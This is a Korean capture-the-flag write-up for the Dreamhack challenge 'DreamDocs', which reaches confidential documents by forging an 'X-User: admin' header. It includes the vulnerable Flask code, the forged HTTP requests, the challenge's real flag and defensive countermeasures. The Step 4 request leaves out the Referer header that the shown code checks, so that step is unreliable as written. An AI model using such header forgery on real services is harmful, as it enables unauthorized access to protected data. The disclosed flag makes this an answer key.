# 📂 Case Analysis: DreamDocs

## 1. 문제 정보 (Challenge Info)
- **Description**: 문서 관리 웹 서비스에서 기밀(confidential) 문서를 열람해 플래그를 획득하는 문제입니다.
- **Target**: 드림핵 워게임 서버 (DreamDocs)
- **Flag Format**: `DH{...}`

## 2. 분석 개요 (Overview)
- **Objective**: 클라이언트가 임의로 조작 가능한 `X-User`·`Referer` 헤더를 위조해 관리자 권한을 획득, 기밀 문서 ID를 알아낸 뒤 플래그를 열람.
- **Key Concept**: **클라이언트 제어 헤더 무검증 신뢰 (Untrusted Client-Controlled Headers for Authorization)**

## 3. 분석 및 해결 단계 (Steps)

### Step 1: 소스코드 분석

서버의 핵심 접근 제어 로직입니다.

```python
flag_doc_id = random.randint(100, 999)   # 플래그 문서 ID는 매 실행마다 변경

@app.route('/doc/<int:doc_id>')
def view_document(doc_id):
    referer    = request.headers.get('Referer', '')
    user_level = request.headers.get('X-User', 'guest')  # 클라이언트 헤더를 직접 신뢰

    if '/share' not in referer:           # Referer 검사: /share 포함 여부만 확인
        abort(403)

    if document['classification'] == 'confidential':
        if user_level != 'admin':         # X-User 검사: 값이 'admin'인지만 확인
            abort(403)

@app.route('/api/docs')
def list_docs():
    user_level = request.headers.get('X-User', 'guest')
    # user_level == 'admin'이면 confidential 문서 목록도 반환
```

### Step 2: Root Cause 파악

| 취약점 | 설명 |
|---|---|
| **`X-User` 헤더 무검증 신뢰** | 사용자 권한 등급을 클라이언트가 보낸 헤더 값으로만 결정, 서버 측 세션·토큰 검증 없음 |

`X-User`는 HTTP 요청 헤더이므로 Burp Suite 등으로 임의로 설정할 수 있습니다.

또한 플래그 문서의 ID가 `random.randint(100, 999)`로 서버 기동 시마다 결정되므로, 먼저 `/api/docs`로 confidential 문서 목록을 조회해 ID를 파악해야 합니다.

### Step 3: 익스플로잇 1단계 — 기밀 문서 ID 파악

Burp Suite로 `/api/docs` 요청에 `X-User: admin` 헤더를 추가합니다.

```
GET /api/docs HTTP/1.1
Host: <target>
...
X-User: admin
```

응답에서 `classification: confidential`인 문서의 ID를 확인합니다.

```json
[
  {"classification":"confidential","id":659,"title":"Confidential Report - Access Restricted"},
  ...
]
```

### Step 4: 익스플로잇 2단계 — 기밀 문서 열람

파악한 ID(`659`)로 `/doc/659` 요청을 Burp Suite로 가로채 `X-User: admin` 헤더를 추가합니다.

```
GET /doc/659 HTTP/1.1
Host: <target>
X-User: admin
```

- `user_level == 'admin'` → True (권한 검사 통과)

응답 HTML에서 플래그를 확인합니다.

```
FLAG: DH{17dda847500b779845306c8d0f16959b}
```

## 4. 결과 (Result)

- **Flag**: `DH{17dda847500b779845306c8d0f16959b}`

## 5. 보안 인사이트 (Retrospective)
- **Root Cause**: 서버가 `X-User`(권한 등급) 헤더를 서버 측 검증 없이 그대로 신뢰함. HTTP 요청 헤더이므로 클라이언트가 임의 값으로 위조할 수 있어, 인증·인가 수단으로 사용하는 것 자체가 근본적 취약점임.
- **Countermeasures**:
  - **서버 측 세션/토큰 기반 인증**: 사용자 권한은 서버가 발급·서명한 세션 쿠키 또는 JWT로 관리하고, 클라이언트가 임의로 설정 가능한 헤더에 의존하지 않음.
  - **신뢰 경계 명확화**: `X-User`처럼 내부 프록시 전용 헤더를 사용하는 경우, 외부에서 유입되는 동일 헤더는 리버스 프록시 레이어에서 반드시 제거(strip)해야 함.
